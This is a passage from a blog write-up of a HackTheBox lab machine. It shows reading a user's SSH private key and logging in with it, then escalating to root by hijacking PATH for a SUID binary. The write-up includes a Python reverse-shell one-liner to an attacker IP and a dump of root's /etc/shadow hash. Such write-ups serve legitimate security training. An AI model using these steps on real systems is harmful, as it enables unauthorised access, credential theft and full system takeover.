</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>theseus@ubuntu:~$ cat .ssh/id_rsa
</span></span></code></pre></td></tr></table></div></div><p><code>.ssh/id_rsa</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>-----BEGIN RSA PRIVATE KEY-----
</span></span><span class=line><span class=cl>MIIEogIBAAKCAQEA6ruVQANqao9pxNJ2g5XkHkyMq5zOCoTlJwTVlkO6HS0X9edW
</span></span><span class=line><span class=cl>EYbRuvDeBIaG9jQ3S2Kp7wWxKnP9TBU2Yd8sAwdjXN4qa4ePGLiRWaI76A3X5Mtu
</span></span><span class=line><span class=cl>TFRzi7/hUrBuO+MhFMgVlkBCDSf9P9JGLFS+9xqAbbi3Jx+MTKjIR7rkkmPJITvj
</span></span><span class=line><span class=cl>wuI5h+fGK1e1OkJ8MGjTlDuHWpVHpixgY07shz5FlXsnUx79y7ZSQZu7XZbEgw3I
</span></span><span class=line><span class=cl>jnZUppKZKXW2vvswDzRQkbwJnRRVNBIKww6IvDLKS0bdvtrVJEh5g+IJT98TNLV1
</span></span><span class=line><span class=cl>eLjVjimmFhv8Zg4YM2cdXtDIUezy+GPgCATbSQIDAQABAoIBAA5cz/MMwnQmtkgO
</span></span><span class=line><span class=cl>wKWohD6+XFUb0Refrg3HI/J/zmF+otqu/vsvjqGrn0oTmSpzY3a/YLp5VK/OTQ9c
</span></span><span class=line><span class=cl>tOkkKKM+znueNGZD8yOGF46ueI/oWO9s6yDMgg1o/jZ7CSOs8Bc/buK0p9X6Pmqr
</span></span><span class=line><span class=cl>SRPpU433FyifhsVkDseaBDcvXlD+oA1AMuoUv7RW+6YEgPLQK+GJqW9qClqJl72A
</span></span><span class=line><span class=cl>ZcwLHV2pEDP8q/r5z+6liUWYZSf9VMjtsB7P7DYLatFb/iXPgMzPl3Ee3K69e7vu
</span></span><span class=line><span class=cl>0H56M6pFfnwBmi9/j7SfWsOkiNH+SCCi9OIcDnSytW1Qvs5L2su5TQ19A8gZps9x
</span></span><span class=line><span class=cl>uOVt4ikCgYEA+RlW8d4QmCGlQD5AdkvxOXHCKkF97z88yRBIfMV+/oNz8IL67QJ2
</span></span><span class=line><span class=cl>fJP71SK8/K3xulmSouaMExmd9hD7soLkyNOr5ek0hEZ2tTnlMEGcqvzf/LPeDx7q
</span></span><span class=line><span class=cl>eFlxn1Ls+u6Jmbr/gyl6kMzpCia+l5K+Azu4ONLRbTQADPDOg1BFbBsCgYEA8Txa
</span></span><span class=line><span class=cl>6VJDR7KyX0165yFReMWz4MuwEyd6kUjjzmSuQn1xWPacUdSxgxqGBGPWx9rFCcMt
</span></span><span class=line><span class=cl>tKBhD8HW1RjO0/vi6K5K/Gygr8D2lpDuY+92EhD3FHx2lZveibloMTS0a42ySm4m
</span></span><span class=line><span class=cl>dsYuhxnJ26VtN/FnQAXZfRM1B0mALx7qP4h0xGsCgYAyDseMH2YSTGCbAmeN3kEB
</span></span><span class=line><span class=cl>nDy6pSKbm4epmB4ZBM86ckwwPwIR8vbAnjRzZmG4HXSAUFPJbK8lf3Zg5pTOEMPN
</span></span><span class=line><span class=cl>H8xhjXXCRy6/yHyoL+c97UdNzw+G1l2kBcVxkQaSfrEkNZH3V7SLuMH0CkkuyIxq
</span></span><span class=line><span class=cl>teuVb7gqS9Lext2ZQd5RlQKBgGxvl+H3Y1zQO5PRTSSl+mxSWif7Bzuk7FhwLk5x
</span></span><span class=line><span class=cl>PU+P+apmuB+kfuKSwpkok7wkX5uiy2G9EcQ2eq4xR49MU1QKPJS484XtNCq8HRx4
</span></span><span class=line><span class=cl>4FcAnz/rLpbTiLXZzLcJnOwXtoP0fX+4V+PMuMrt0mlqLuI9fuTVBGoxJNiJifxj
</span></span><span class=line><span class=cl>BzHfAoGARjeDy+yQSUUwUbrFMbyWhNnX8fef4h4lGmlZTZTjC5tL1tOQ3/QPvgnp
</span></span><span class=line><span class=cl>I9Esc9FP8QLqR3jJOdijaN59oByGFiEE1QGnODeHRt2czK388XtH/FTqsjhH360R
</span></span><span class=line><span class=cl>+8ylF6696X9DMnUQ4NEvDRRLR7JKae8fcu5d/SRsenB+1ck2djs=
</span></span><span class=line><span class=cl>-----END RSA PRIVATE KEY-----
</span></span></code></pre></td></tr></table></div></div><p>So we can login through SSH now:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>chmod</span> <span class=mi>600</span> <span class=n>id_rsa</span>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>ssh</span> <span class=n>theseus</span><span class=err>@</span><span class=mf>10.10</span><span class=o>.</span><span class=mf>10.185</span> <span class=o>-</span><span class=n>i</span> <span class=n>id_rsa</span>
</span></span><span class=line><span class=cl><span class=nb>load</span> <span class=n>pubkey</span> <span class=s2>&#34;id_rsa&#34;</span><span class=p>:</span> <span class=n>invalid</span> <span class=n>format</span>
</span></span><span class=line><span class=cl><span class=n>Welcome</span> <span class=n>to</span> <span class=n>Ubuntu</span> <span class=mf>18.04</span><span class=o>.</span><span class=mi>4</span> <span class=n>LTS</span> <span class=p>(</span><span class=n>GNU</span><span class=o>/</span><span class=n>Linux</span> <span class=mf>5.3</span><span class=o>.</span><span class=mi>0</span><span class=o>-</span><span class=mi>42</span><span class=o>-</span><span class=n>generic</span> <span class=n>x86_64</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>*</span> <span class=n>Documentation</span><span class=p>:</span>  <span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>help</span><span class=o>.</span><span class=n>ubuntu</span><span class=o>.</span><span class=n>com</span>
</span></span><span class=line><span class=cl> <span class=o>*</span> <span class=n>Management</span><span class=p>:</span>     <span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>landscape</span><span class=o>.</span><span class=n>canonical</span><span class=o>.</span><span class=n>com</span>
</span></span><span class=line><span class=cl> <span class=o>*</span> <span class=n>Support</span><span class=p>:</span>        <span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>ubuntu</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=n>advantage</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>*</span> <span class=n>Canonical</span> <span class=n>Livepatch</span> <span class=n>is</span> <span class=n>available</span> <span class=k>for</span> <span class=n>installation</span><span class=o>.</span>
</span></span><span class=line><span class=cl>   <span class=o>-</span> <span class=n>Reduce</span> <span class=n>system</span> <span class=n>reboots</span> <span class=ow>and</span> <span class=n>improve</span> <span class=n>kernel</span> <span class=n>security</span><span class=o>.</span> <span class=n>Activate</span> <span class=n>at</span><span class=p>:</span>
</span></span><span class=line><span class=cl>     <span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>ubuntu</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=n>livepatch</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=mi>29</span> <span class=n>packages</span> <span class=n>can</span> <span class=n>be</span> <span class=n>updated</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=mi>0</span> <span class=n>updates</span> <span class=n>are</span> <span class=n>security</span> <span class=n>updates</span><span class=o>.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Failed</span> <span class=n>to</span> <span class=n>connect</span> <span class=n>to</span> <span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>changelogs</span><span class=o>.</span><span class=n>ubuntu</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=n>meta</span><span class=o>-</span><span class=n>release</span><span class=o>-</span><span class=n>lts</span><span class=o>.</span> <span class=n>Check</span> <span class=n>your</span> <span class=n>Internet</span> <span class=n>connection</span> <span class=ow>or</span> <span class=n>proxy</span> <span class=n>settings</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Your</span> <span class=n>Hardware</span> <span class=n>Enablement</span> <span class=n>Stack</span> <span class=p>(</span><span class=n>HWE</span><span class=p>)</span> <span class=n>is</span> <span class=n>supported</span> <span class=n>until</span> <span class=n>April</span> <span class=mf>2023.</span>
</span></span><span class=line><span class=cl><span class=n>Last</span> <span class=n>login</span><span class=p>:</span> <span class=n>Thu</span> <span class=n>Jul</span>  <span class=mi>2</span> <span class=mi>08</span><span class=p>:</span><span class=mi>19</span><span class=p>:</span><span class=mi>49</span> <span class=mi>2020</span> <span class=n>from</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>15.71</span>
</span></span><span class=line><span class=cl><span class=n>theseus</span><span class=err>@</span><span class=n>ubuntu</span><span class=p>:</span><span class=o>~$</span>
</span></span></code></pre></td></tr></table></div></div><p>Note: is you are denied it&rsquo;s because someone overwrote <code>authorized_keys</code> with
it&rsquo;s personal key. So just append theseus public key:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>theseus@ubuntu:~$ cat .ssh/id_rsa.pub &gt;&gt; .ssh/authorized_keys
</span></span></code></pre></td></tr></table></div></div><p>PS: it seems the private key I used was not part of the box but generated by
another player, anyway you&rsquo;ll have to add a key to <code>.ssh/authorized_keys</code>.</p><h2 id=system-enumeration>System enumeration<a hidden class=anchor aria-hidden=true href=#system-enumeration>#</a></h2><p>Let&rsquo;s find binaries with SUID:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>theseus@ubuntu:~$ find / -perm -u=s -type f 2&gt;/dev/null
</span></span><span class=line><span class=cl>/usr/sbin/pppd
</span></span><span class=line><span class=cl>/usr/bin/newgrp
</span></span><span class=line><span class=cl>/usr/bin/passwd
</span></span><span class=line><span class=cl>/usr/bin/chfn
</span></span><span class=line><span class=cl>/usr/bin/gpasswd
</span></span><span class=line><span class=cl>/usr/bin/sudo
</span></span><span class=line><span class=cl>/usr/bin/pkexec
</span></span><span class=line><span class=cl>/usr/bin/chsh
</span></span><span class=line><span class=cl>/usr/bin/traceroute6.iputils
</span></span><span class=line><span class=cl>/usr/bin/arping
</span></span><span class=line><span class=cl>/usr/bin/vmware-user-suid-wrapper
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>/bin/umount
</span></span><span class=line><span class=cl>/bin/fusermount
</span></span><span class=line><span class=cl>/bin/sysinfo
</span></span><span class=line><span class=cl>/bin/mount
</span></span><span class=line><span class=cl>/bin/su
</span></span><span class=line><span class=cl>/bin/ping
</span></span></code></pre></td></tr></table></div></div><p><code>/bin/sysinfo</code> looks unusual:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>theseus@ubuntu:~$ ls -lh /bin/sysinfo
</span></span><span class=line><span class=cl>-rwsr-x--- 1 root users 22K Oct 21  2019 /bin/sysinfo
</span></span></code></pre></td></tr></table></div></div><h2 id=privilege-escalation--theseus-to-root>Privilege Escalation : theseus to root<a hidden class=anchor aria-hidden=true href=#privilege-escalation--theseus-to-root>#</a></h2><p>If we run <code>sysinfo</code> there are 4 sections that seems to match so other system
commands:</p><ul><li>Hardware Info: <code>lshw -short</code></li><li>Disk Info: <code>fdisk -l</code></li><li>CPU Info: <code>cat /proc/cpuinfo</code></li><li>MEM Usage: <code>free -h</code></li></ul><p>So basically what we have to do is change the <code>PATH</code> env var to force the SUID
<code>sysinfo</code> to call an attacker controlled binary instead of the system tools.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>mkdir</span> <span class=o>/</span><span class=n>tmp</span><span class=o>/</span><span class=n>cyfun</span>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>cd</span> <span class=o>/</span><span class=n>tmp</span><span class=o>/</span><span class=n>cyfun</span>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>touch</span> <span class=n>fdisk</span>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>vi</span> <span class=n>fdisk</span>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>chmod</span> <span class=o>+</span><span class=n>x</span> <span class=n>fdisk</span>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=k>export</span> <span class=n>PATH</span><span class=o>=/</span><span class=n>tmp</span><span class=o>/</span><span class=n>cyfun</span><span class=p>:</span><span class=o>$</span><span class=n>PATH</span>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>echo</span> <span class=o>$</span><span class=n>PATH</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>tmp</span><span class=o>/</span><span class=n>cyfun</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>local</span><span class=o>/</span><span class=n>sbin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>local</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>sbin</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>games</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>local</span><span class=o>/</span><span class=n>games</span><span class=p>:</span><span class=o>/</span><span class=n>snap</span><span class=o>/</span><span class=n>bin</span>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>which</span> <span class=n>fdisk</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>tmp</span><span class=o>/</span><span class=n>cyfun</span><span class=o>/</span><span class=n>fdisk</span>
</span></span></code></pre></td></tr></table></div></div><p>Here is the reverse shell I put in <code>fdisk</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.15.32&#34;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;
</span></span></code></pre></td></tr></table></div></div><p>The we just have to run <code>sysinfo</code> to get the root shell:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ pwncat -l 8888 -v
</span></span><span class=line><span class=cl># pwd
</span></span><span class=line><span class=cl>/tmp/cyfun
</span></span><span class=line><span class=cl># cd /root
</span></span><span class=line><span class=cl># cat root.txt
</span></span><span class=line><span class=cl>8b6a4fda49b7bcfe0ed6b1925d45bd96
</span></span><span class=line><span class=cl># cat /etc/shadow | grep root
</span></span><span class=line><span class=cl>root:$6$P9JXkqrh$tQfL.bHaQQmi7tBxwKp2wdSTB0D19Q.PHM.8tdLanqBEs70cKzul4SEY0PqfbxVkUv7bR5wrKYXJlb0p69c42.:18184:0:99999:7:::
</span></span></code></pre></td></tr></table></div></div><p>:
[weevely]:https://github.com/epinna/weevely3
[msf]:https://www.metasploit.com/
[pwncat]:https://pwncat.org/</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/medium/>Medium</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>